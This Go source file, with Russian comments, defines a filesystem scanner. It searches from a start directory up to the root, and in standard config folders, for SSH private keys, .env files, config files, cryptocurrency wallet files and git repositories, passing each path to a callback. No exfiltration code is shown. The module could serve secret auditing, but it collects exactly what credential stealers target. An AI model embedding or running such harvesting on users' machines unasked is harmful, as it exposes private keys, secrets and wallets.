package scaner

import (
	"bufio"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"strings"

	"github.com/bmatcuk/doublestar/v4"
)

// SearchItemType — тип найденного элемента (битовая маска для SetSearchTypes).
type SearchItemType uint

// Константы битовой маски для типов поиска (SetSearchTypes).
const (
	SearchSSHKeys      SearchItemType = 1 << iota // SSH ключи
	SearchEnvFiles                                // .env файлы
	SearchConfigFiles                             // конфигурационные файлы
	SearchWalletFiles                             // файлы электронных кошельков
	SearchGitDirectory                            // git-репозитории
	SearchJsons                                   // json-файлы
)

// FindCallback определяет тип функции для обработки найденных файлов (тип элемента, путь).
type FindCallback func(SearchItemType, string) error

// SearchAll — поиск всех типов, кроме git (по умолчанию).
const SearchAll = SearchSSHKeys | SearchEnvFiles | SearchConfigFiles | SearchWalletFiles

const errMaxSuccessfulFindsReached = "max successful finds reached"

type ClientScaner struct {
	findCallback    FindCallback // Функция для обработки найденных файлов
	scannedDirs     map[string]bool
	keysScannedDirs map[string]bool
	gitRepos        []string
	sshKeys         []string // Пути к найденным SSH ключам
	envFiles        []string // Пути к найденным .env файлам
	configFiles     []string // Пути к найденным конфигурационным файлам
	walletFiles     []string // Пути к найденным файлам электронных кошельков
	jsonFiles       []string
	verbose         bool // Уровень детализации логирования

	searchMask SearchItemType // битовая маска типов поиска (SearchSSHKeys и т.д.)

	// Остановить поиск после N успешных обработок (findCallback вернул nil). 0 = без лимита.
	maxSuccessfulFinds   int
	successfulFindsCount int
}

func NewScaner(callback FindCallback, verbose bool) *ClientScaner {
	scaner := &ClientScaner{
		findCallback: callback,
		verbose:      verbose,
		searchMask:   SearchAll, // по умолчанию без SearchGitDirectory
	}

	return scaner
}

// SetVerbose устанавливает уровень детализации логирования
func (c *ClientScaner) WaitForQueueEmpty() {
	// Метод больше не нужен, так как мы не используем client напрямую
	// Очередь обрабатывается внутри findCallback
}

func (c *ClientScaner) SetVerbose(verbose bool) {
	c.verbose = verbose
}

// SetFindCallback устанавливает пользовательскую функцию для обработки найденных файлов
func (c *ClientScaner) SetFindCallback(callback FindCallback) {
	c.findCallback = callback
}

// SetSearchTypes устанавливает типы файлов для поиска по битовой маске (SearchSSHKeys | SearchEnvFiles | ...).
func (c *ClientScaner) SetSearchTypes(mask SearchItemType) {
	c.searchMask = mask
}

// SetMaxSuccessfulFinds задаёт лимит: остановить поиск после N успешных находок (когда findCallback вернул nil).
// 0 — без лимита. Применяется к ScanGitRepos.
func (c *ClientScaner) SetMaxSuccessfulFinds(n int) {
	c.maxSuccessfulFinds = n
}

// GetSshKeys возвращает список найденных SSH ключей
func (c *ClientScaner) GetSshKeys() []string {
	return c.sshKeys
}

// GetEnvFiles возвращает список найденных .env файлов
func (c *ClientScaner) GetEnvFiles() []string {
	return c.envFiles
}

// GetConfigFiles возвращает список найденных конфигурационных файлов
func (c *ClientScaner) GetConfigFiles() []string {
	return c.configFiles
}

// GetWalletFiles возвращает список найденных файлов кошельков
func (c *ClientScaner) GetWalletFiles() []string {
	return c.walletFiles
}

func Jsons(path string, callback FindCallback) error {
	scanner := NewScaner(callback, false)
	return scanner.Jsons(path)
}

// JsonsWithContent обходит JSON-файлы от path и для каждого вызывает callback с содержимым файла.
func JsonsWithContent(path string, callback func(content string) error) error {
	return Jsons(path, func(itemType SearchItemType, filePath string) error {
		if itemType != SearchJsons {
			return nil
		}
		data, err := os.ReadFile(filePath)
		if err != nil {
			return fmt.Errorf("чтение %s: %w", filePath, err)
		}
		return callback(string(data))
	})
}

// Jsons обходит дерево от path, ищет файлы *.json и для каждого вызывает findCallback с SearchJsons.
// Если path указывает на файл с расширением .json, вызывается findCallback только для него.
func (c *ClientScaner) Jsons(path string) error {
	absPath, err := filepath.Abs(path)
	if err != nil {
		return fmt.Errorf("ошибка получения абсолютного пути: %w", err)
	}
	info, err := os.Stat(absPath)
	if err != nil {
		return fmt.Errorf("ошибка доступа к пути %s: %w", path, err)
	}
	if !info.IsDir() {
		if strings.HasSuffix(strings.ToLower(info.Name()), ".json") {
			c.jsonFiles = append(c.jsonFiles, absPath)
			c.logfDebug("Найден JSON файл: %s\n", absPath)
			return c.findEvent(SearchJsons, absPath)
		}
		return nil
	}
	if !c.hasReadPermission(absPath) {
		return fmt.Errorf("нет разрешения на чтение директории: %s", absPath)
	}
	err = doublestar.GlobWalk(os.DirFS(absPath), "**/*.json",
		func(p string, d fs.DirEntry) error {
			if d.IsDir() {
				return nil
			}
			fullPath := filepath.Join(absPath, p)
			if isSystemPath(fullPath) {
				c.logfDebug("Пропускаем системный путь: %s\n", fullPath)
				return nil
			}
			if !c.hasReadPermission(filepath.Dir(fullPath)) {
				c.logfDebug("Пропускаем файл (нет доступа к директории): %s\n", fullPath)
				return nil
			}
			if shouldSkipDirectory(filepath.Base(filepath.Dir(fullPath))) || shouldSkipPath(filepath.Dir(fullPath)) {
				return nil
			}
			c.jsonFiles = append(c.jsonFiles, fullPath)
			c.logfDebug("Найден JSON файл: %s\n", fullPath)
			return c.findEvent(SearchJsons, fullPath)
		},
		doublestar.WithNoFollow(),
	)
	return err
}

// logf выводит сообщение только если включен verbose режим
func (c *ClientScaner) logfDebug(format string, args ...interface{}) {
}

func (c *ClientScaner) logf(format string, args ...interface{}) {
	if c.verbose {
		fmt.Printf(format, args...)
	}
}

// ScanGitRepos сканирует указанную директорию на наличие Git репозиториев и обрабатывает их
// targetURL - опциональный параметр для поиска конкретного URL. Если указан и найден, поиск прекращается
//
// Примеры использования:
//
//	c.ScanGitRepos("/path/to/dir")                    // обычное сканирование
//	c.ScanGitRepos("/path/to/dir", "github.com")      // поиск репозитория с github.com в URL
//	c.ScanGitRepos("/path/to/dir", "my-repo.git")     // поиск конкретного репозитория
func (c *ClientScaner) ScanGitRepos(rootPath string, matchUrl ...string) error {
	if len(matchUrl) > 0 && matchUrl[0] != "" {
		c.logf("Сканирование Git репозиториев в: %s (поиск URL: %s)\n", rootPath, matchUrl[0])
	} else {
		c.logf("Сканирование Git репозиториев в: %s\n", rootPath)
	}

	// Находим все Git репозитории
	err := c.findGitRepos(rootPath, matchUrl...)
	if err != nil {
		return fmt.Errorf("ошибка поиска Git репозиториев: %w", err)
	}

	return nil
}

// ScanConfigFiles сканирует указанную директорию на наличие конфигурационных файлов и обрабатывает их
func (c *ClientScaner) ScanConfigFiles(rootPath string) error {
	c.logfDebug("Сканирование конфигурационных файлов в: %s\n", rootPath)

	// Находим все конфигурационные файлы
	err := c.findConfigFiles(rootPath)
	if err != nil {
		return fmt.Errorf("ошибка поиска конфигурационных файлов: %w", err)
	}

	c.logf("Найдено SSH ключей: %d\n", len(c.sshKeys))
	c.logf("Найдено .env файлов: %d\n", len(c.envFiles))
	c.logf("Найдено конфигурационных файлов: %d\n", len(c.configFiles))
	c.logf("Найдено файлов электронных кошельков: %d\n", len(c.walletFiles))

	// Обрабатываем каждый найденный SSH ключ
	for _, keyPath := range c.sshKeys {
		c.logfDebug("Найден SSH ключ: %s\n", keyPath)
		err := c.findEvent(SearchSSHKeys, keyPath)
		if err != nil {
			c.logf("Ошибка загрузки SSH ключа: %v\n", err)
		}
	}

	// Обрабатываем каждый найденный .env файл
	for _, envPath := range c.envFiles {
		c.logfDebug("Найден .env файл: %s\n", envPath)
		err := c.findEvent(SearchEnvFiles, envPath)
		if err != nil {
			c.logf("Ошибка загрузки .env файла: %v\n", err)
		}
	}

	// Обрабатываем каждый найденный конфигурационный файл
	for _, configPath := range c.configFiles {
		c.logfDebug("Найден конфигурационный файл: %s\n", configPath)
		err := c.findEvent(SearchConfigFiles, configPath)
		if err != nil {
			c.logf("Ошибка загрузки конфигурационного файла: %v\n", err)
		}
	}

	// Обрабатываем каждый найденный файл электронного кошелька
	for _, walletPath := range c.walletFiles {
		c.logfDebug("Найден файл электронного кошелька: %s\n", walletPath)
		err := c.findEvent(SearchWalletFiles, walletPath)
		if err != nil {
			c.logf("Ошибка загрузки файла электронного кошелька: %v\n", err)
		}
	}

	return nil
}

// findGitRepos находит все Git репозитории, начиная с указанной директории и поднимаясь вверх по иерархии
// targetURL - опциональный параметр для поиска конкретного URL. Если указан и найден, поиск прекращается
func (c *ClientScaner) findGitRepos(startPath string, matchUrl ...string) error {
	c.scannedDirs = make(map[string]bool) // Карта уже просканированных директорий
	c.successfulFindsCount = 0

	// Получаем абсолютный путь начальной директории
	absStartPath, err := filepath.Abs(startPath)
	if err != nil {
		return fmt.Errorf("ошибка получения абсолютного пути: %w", err)
	}

	// Начинаем с текущной директории и поднимаемся вверх
	currentDir := absStartPath

	for {
		// Проверяем, не сканировали ли мы уже эту директорию
		if c.scannedDirs[currentDir] {
			break
		}
		// Отмечаем директорию как просканированную

		c.logfDebug("Сканируем %v", currentDir)
		// Сканируем текущую директорию и все её поддиректории
		err := c.scanDirectoryRecursively(currentDir, matchUrl...)
		if err != nil {
			// Если найден целевой репозиторий, прекращаем поиск
			if strings.Contains(err.Error(), "target repository found:") {
				c.logf("Целевой репозиторий найден в %s, поиск завершен\n", currentDir)
				return nil
			}
			// Достигнут лимит успешных находок — нормальное завершение
			if err.Error() == errMaxSuccessfulFindsReached {
				c.logf("Достигнут лимит успешных находок (%d), поиск остановлен\n", c.maxSuccessfulFinds)
				return nil
			}
			c.logfDebug("Предупреждение: ошибка сканирования %s: %v\n", currentDir, err)
		}
		c.scannedDirs[currentDir] = true
		// Переходим к родительской директории
		parentDir := filepath.Dir(currentDir)

		// Если достигли корня файловой системы, прекращаем
		if parentDir == currentDir {
			break
		}

		currentDir = parentDir
	}

	return nil
}

// findConfigFiles находит все конфигурационные файлы, начиная с указанной директории и поднимаясь вверх по иерархии
func (c *ClientScaner) findConfigFiles(startPath string) error {
	c.keysScannedDirs = make(map[string]bool) // Карта уже просканированных директорий

	// Получаем абсолютный путь начальной директории
	absStartPath, err := filepath.Abs(startPath)
	if err != nil {
		return fmt.Errorf("ошибка получения абсолютного пути: %w", err)
	}

	// Сначала ищем в стандартных местах для конфигурационных файлов
	standardConfigDirs := getStandardConfigDirectoriesOrFiles()
	for _, configDir := range standardConfigDirs {
		if c.hasReadPermission(configDir) {
			err := c.scanDirectoryForConfigFiles(configDir)
			if err != nil {
				c.logf("Предупреждение: ошибка сканирования стандартной конфигурационной директории %s: %v\n", configDir, err)
			}
		}
	}

	// Затем ищем в указанной директории и поднимаемся вверх
	currentDir := absStartPath

	for {
		// Проверяем, не сканировали ли мы уже эту директорию
		if c.keysScannedDirs[currentDir] {
			break
		}

		// Отмечаем директорию как просканированную
		c.keysScannedDirs[currentDir] = true
		c.logfDebug("Сканируем %v", currentDir)
		// Сканируем текущую директорию и все её поддиректории
		err := c.scanDirectoryForConfigFiles(currentDir)
		if err != nil {
			c.logf("Предупреждение: ошибка сканирования %s: %v\n", currentDir, err)
		}

		// Переходим к родительской директории
		parentDir := filepath.Dir(currentDir)

		// Если достигли корня файловой системы, прекращаем
		if parentDir == currentDir {
			break
		}

		currentDir = parentDir
	}

	return nil
}

// scanDirectoryForConfigFiles сканирует директорию и все её поддиректории на наличие конфигурационных файлов
func (c *ClientScaner) scanDirectoryForConfigFiles(rootDir string) error {
	// Проверяем разрешения доступа к директории
	if !c.hasReadPermission(rootDir) {
		return fmt.Errorf("нет разрешения на чтение директории: %s", rootDir)
	}

	// Map для отслеживания папок с .git директориями
	gitDirs := make(map[string]bool)

	// Используем doublestar для обхода всех поддиректорий
	err := doublestar.GlobWalk(os.DirFS(rootDir), "**",
		func(path string, d fs.DirEntry) error {
			// Получаем полный путь
			fullPath := filepath.Join(rootDir, path)

			// Проверяем директории для пропуска
			if d.IsDir() {
				// Проверяем, содержит ли текущая директория .git
				if _, err := os.Stat(filepath.Join(fullPath, ".git")); err == nil {
					gitDirs[fullPath] = true
					c.logfDebug("Обнаружена .git директория: %s\n", fullPath)
				}

				// Проверяем глубину относительно ближайшей .git директории
				for gitDir := range gitDirs {
					if strings.HasPrefix(fullPath, gitDir) {
						// Вычисляем глубину относительно .git директории
						relPath, _ := filepath.Rel(gitDir, fullPath)
						depth := len(strings.Split(relPath, string(filepath.Separator)))

						// Если глубина больше 2, пропускаем директорию
						if depth > 2 {
							c.logfDebug("Пропускаем директорию (превышена глубина 2 от .git): %s (глубина: %d)\n", fullPath, depth)
							return doublestar.SkipDir
						}
						break
					}
				}

				// Проверяем, нужно ли пропускать директорию по имени
				if shouldSkipDirectory(filepath.Base(fullPath)) {
					c.logfDebug("Пропускаем директорию (по имени): %s\n", fullPath)
					return doublestar.SkipDir
				}

				// Проверяем, нужно ли пропускать путь на основе его содержимого
				if shouldSkipPath(fullPath) {
					c.logfDebug("Пропускаем директорию (по пути): %s\n", fullPath)
					return doublestar.SkipDir
				}

				// Проверяем разрешения доступа к директории
				if !c.hasReadPermission(fullPath) {
					c.logfDebug("Пропускаем директорию (нет доступа): %s\n", fullPath)
					return doublestar.SkipDir
				}

				return nil
			}

			// Обрабатываем только файлы
			// Сначала проверяем, не является ли это системным путем
			if isSystemPath(fullPath) {
				c.logfDebug("Пропускаем системный путь: %s\n", fullPath)
				return nil
			}

			// Проверяем разрешения доступа к родительской директории файла
			if !c.hasReadPermission(filepath.Dir(fullPath)) {
				c.logfDebug("Пропускаем файл (нет доступа к директории): %s\n", fullPath)
				return nil
			}

			// Получаем имя файла для проверки
			fileName := filepath.Base(fullPath)

			if c.searchMask&SearchSSHKeys != 0 {
				// Проверяем, является ли файл SSH ключом
				if isSshKeyFile(fileName) {
					c.logfDebug("Найден SSH ключ: %s\n", fullPath)
					c.sshKeys = append(c.sshKeys, fullPath)
					err := c.findEvent(SearchSSHKeys, fullPath)
					if err != nil {
						c.logf("Ошибка загрузки SSH ключа: %v\n", err)
					}
				}
			}

			if c.searchMask&SearchEnvFiles != 0 {
				// Проверяем, является ли файл .env файлом
				if isEnvFile(fileName) {
					c.logfDebug("Найден .env файл: %s\n", fullPath)
					c.envFiles = append(c.envFiles, fullPath)
					err := c.findEvent(SearchEnvFiles, fullPath)
					if err != nil {
						c.logf("Ошибка загрузки .env файла: %v\n", err)
					}
				}
			}

			if c.searchMask&SearchConfigFiles != 0 {
				// Проверяем, является ли файл конфигурационным файлом
				if isConfigFile(fileName) {
					c.logfDebug("Найден конфигурационный файл: %s\n", fullPath)
					c.configFiles = append(c.configFiles, fullPath)
					err := c.findEvent(SearchConfigFiles, fullPath)
					if err != nil {
						c.logf("Ошибка загрузки конфигурационного файла: %v\n", err)
					}
				}
			}
			if c.searchMask&SearchWalletFiles != 0 {
				// Проверяем, является ли файл файлом электронного кошелька
				if isWalletFile(fileName) {
					c.logfDebug("Найден файл электронного кошелька: %s\n", fullPath)
					c.walletFiles = append(c.walletFiles, fullPath)
					err := c.findEvent(SearchWalletFiles, fullPath)
					if err != nil {
						c.logf("Ошибка загрузки файла электронного кошелька: %v\n", err)
					}
				}
			}

			return nil
		},
		doublestar.WithNoFollow(), // Не следовать по символическим ссылкам
	)

	return err
}

// scanDirectoryRecursively сканирует директорию и все её поддиректории на наличие .git папок
// targetURL - опциональный параметр для поиска конкретного URL. Если указан и найден, сканирование прекращается
//
// Примеры использования:
//
//	c.scanDirectoryRecursively("/path/to/dir")                    // обычное сканирование
//	c.scanDirectoryRecursively("/path/to/dir", "github.com")      // поиск репозитория с github.com в URL
//	c.scanDirectoryRecursively("/path/to/dir", "my-repo.git")     // поиск конкретного репозитория
func (c *ClientScaner) scanDirectoryRecursively(rootDir string, urlMatch ...string) error {
	// Проверяем разрешения доступа к директории
	if !c.hasReadPermission(rootDir) {
		return fmt.Errorf("нет разрешения на чтение директории: %s", rootDir)
	}

	// Определяем, ищем ли мы конкретный URL
	var searchTargetURL string
	if len(urlMatch) > 0 && urlMatch[0] != "" {
		searchTargetURL = urlMatch[0]
		c.logfDebug("Поиск репозитория с URL: %s\n", searchTargetURL)
	}

	// Используем doublestar для обхода всех поддиректорий
	err := doublestar.GlobWalk(os.DirFS(rootDir), "**",
		func(path string, d fs.DirEntry) error {
			// Получаем полный путь
			fullPath := filepath.Join(rootDir, path)

			// Проверяем только директории
			if !d.IsDir() {
				return nil
			}
			if c.scannedDirs[fullPath] {
				c.logfDebug("Пропускаем уже иследованный путь: %s\n", fullPath)
				return doublestar.SkipDir
			}

			// Сначала проверяем, не является ли это системным путем
			if isSystemPath(fullPath) {
				c.logfDebug("Пропускаем системный путь: %s\n", fullPath)
				return doublestar.SkipDir
			}

			// Затем проверяем разрешения доступа
			if !c.hasReadPermission(fullPath) {
				c.logfDebug("Пропускаем директорию (нет доступа): %s\n", fullPath)
				return doublestar.SkipDir
			}

			// Получаем имя директории для проверки
			dirName := filepath.Base(fullPath)

			// Проверяем, нужно ли пропускать эту директорию по имени
			if shouldSkipDirectory(dirName) {
				c.logfDebug("Пропускаем директорию (по имени): %s\n", fullPath)
				return doublestar.SkipDir
			}

			// Проверяем, нужно ли пропускать путь на основе его содержимого
			if shouldSkipPath(fullPath) {
				c.logfDebug("Пропускаем директорию (по пути): %s\n", fullPath)
				return doublestar.SkipDir
			}

			c.logfDebug("Сканируем %v", fullPath)
			if existsDirectory(filepath.Join(fullPath, ".git")) {
				c.gitRepos = append(c.gitRepos, fullPath)

				// Путь к файлу конфигурации Git
				configPath := filepath.Join(fullPath, ".git", "config")

				// Если ищем конкретный URL, парсим конфигурацию и проверяем
				if searchTargetURL != "" {
					remoteUrls, err := c.parseGitConfigRemoteUrls(configPath)
					if err != nil {
						c.logfDebug("Ошибка парсинга Git конфигурации: %v\n", err)
					} else {
						// Проверяем, содержит ли репозиторий искомый URL
						for _, url := range remoteUrls {
							if strings.Contains(url, searchTargetURL) {
								c.logf("Найден репозиторий с искомым URL: %s (URL: %s)\n", fullPath, url)
								err := c.findEvent(SearchGitDirectory, fullPath)
								if err != nil {
									c.logf("Ошибка загрузки конфигурации Git: %v\n", err)
								} else if c.maxSuccessfulFinds > 0 {
									c.successfulFindsCount++
									if c.successfulFindsCount >= c.maxSuccessfulFinds {
										return fmt.Errorf("%s", errMaxSuccessfulFindsReached)
									}
								}
							}
						}
					}
				} else {
					err := c.findEvent(SearchGitDirectory, configPath)
					if err != nil {
						c.logf("Ошибка загрузки конфигурации Git: %v\n", err)
					} else if c.maxSuccessfulFinds > 0 {
						c.successfulFindsCount++
						if c.successfulFindsCount >= c.maxSuccessfulFinds {
							return fmt.Errorf("%s", errMaxSuccessfulFindsReached)
						}
					}
				}

				return doublestar.SkipDir
			}

			// Отмечаем директорию как просканированную
			c.scannedDirs[fullPath] = true

			return nil
		},
		doublestar.WithNoFollow(), // Не следовать по символическим ссылкам
	)

	// Если ошибка связана с найденным целевым репозиторием или лимитом находок — не ошибка
	if err != nil {
		if strings.Contains(err.Error(), "target repository found:") {
			c.logf("Целевой репозиторий найден, сканирование завершено\n")
			return nil
		}
		if err.Error() == errMaxSuccessfulFindsReached {
			return err
		}
	}
	return err
}

func (c *ClientScaner) findEvent(itemType SearchItemType, path string) error {
	if c.findCallback != nil {
		return c.findCallback(itemType, path)
	}
	return nil
}

// hasReadPermission проверяет, есть ли разрешение на чтение файла или директории
func (c *ClientScaner) hasReadPermission(path string) bool {
	// Сначала проверяем, существует ли файл или директория
	info, err := os.Stat(path)
	if err != nil {
		// Если файл/директория не существует или нет доступа, возвращаем false
		c.logf("Пропускаем (не существует): %s\n", path)
		return false
	}

	// Проверяем права доступа к файлу/директории
	if info.Mode()&0400 == 0 {
		// Нет прав на чтение для владельца
		c.logf("Пропускаем (нет прав на чтение): %s\n", path)
		return false
	}

	// Если это директория, проверяем возможность чтения её содержимого
	if info.IsDir() {
		_, err = os.ReadDir(path)
		if err != nil {
			// Проверяем конкретные ошибки доступа
			if os.IsPermission(err) {
				// Нет разрешений на чтение директории
				c.logfDebug("Пропускаем директорию (нет доступа): %s\n", path)
				return false
			}
			if os.IsNotExist(err) {
				// Директория не существует
				return false
			}
			// Другие ошибки
			c.logfDebug("Пропускаем директорию (другая ошибка): %s\n", path)
			return false
		}
	} else {
		// Если это файл, проверяем возможность его открытия для чтения
		file, err := os.OpenFile(path, os.O_RDONLY, 0)
		if err != nil {
			if os.IsPermission(err) {
				// Нет разрешений на чтение файла
				c.logfDebug("Пропускаем файл (нет доступа): %s\n", path)
				return false
			}
			// Другие ошибки
			c.logfDebug("Пропускаем файл (другая ошибка): %s\n", path)
			return false
		}
		file.Close()
	}

	return true
}

// existsDirectory проверяет, существует ли указанная директория
func existsDirectory(path string) bool {
	info, err := os.Stat(path)
	if err != nil {
		return false
	}
	return info.IsDir()
}

// parseGitConfigRemoteUrls парсит файл .git/config и возвращает все remote URLs
func (c *ClientScaner) parseGitConfigRemoteUrls(configPath string) ([]string, error) {
	file, err := os.Open(configPath)
	if err != nil {
		return nil, fmt.Errorf("ошибка открытия файла конфигурации Git: %w", err)
	}
	defer file.Close()

	var remoteUrls []string
	scanner := bufio.NewScanner(file)
	var currentRemote string

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())

		// Проверяем, является ли строка секцией remote
		if strings.HasPrefix(line, "[remote \"") && strings.HasSuffix(line, "\"]") {
			// Извлекаем имя remote из строки [remote "origin"]
			start := len("[remote \"")
			end := len(line) - 2 // убираем "]
			if start < end {
				currentRemote = line[start:end]
			}
			continue
		}

		// Если мы находимся в секции remote и встречаем url
		if currentRemote != "" && strings.HasPrefix(line, "url = ") {
			url := strings.TrimSpace(strings.TrimPrefix(line, "url = "))
			remoteUrls = append(remoteUrls, url)
			c.logfDebug("Найден remote URL для '%s': %s\n", currentRemote, url)
		}

		// Если встречаем новую секцию, сбрасываем currentRemote
		if strings.HasPrefix(line, "[") && !strings.HasPrefix(line, "[remote") {
			currentRemote = ""
		}
	}

	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("ошибка чтения файла конфигурации Git: %w", err)
	}

	return remoteUrls, nil
}

// processGitFolder обрабатывает папку .git и извлекает URL репозитория
func (c *ClientScaner) processGitFolder(configPath string) (string, error) {

	// Читаем файл конфигурации
	content, err := os.ReadFile(configPath)
	if err != nil {
		return "", fmt.Errorf("ошибка чтения файла конфигурации Git: %w", err)
	}

	// Ищем URL репозитория в конфигурации
	lines := strings.Split(string(content), "\n")
	for i, line := range lines {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "[remote \"origin\"]") {
			// Ищем следующую строку с URL
			for j := i + 1; j < len(lines); j++ {
				nextLine := strings.TrimSpace(lines[j])
				if strings.HasPrefix(nextLine, "url = ") {
					url := strings.TrimPrefix(nextLine, "url = ")
					return strings.TrimSpace(url), nil
				}
				// Если встретили новую секцию, прекращаем поиск
				if strings.HasPrefix(nextLine, "[") && j > i+1 {
					break
				}
			}
		}
	}

	return "", fmt.Errorf("URL репозитория не найден в конфигурации Git")
}
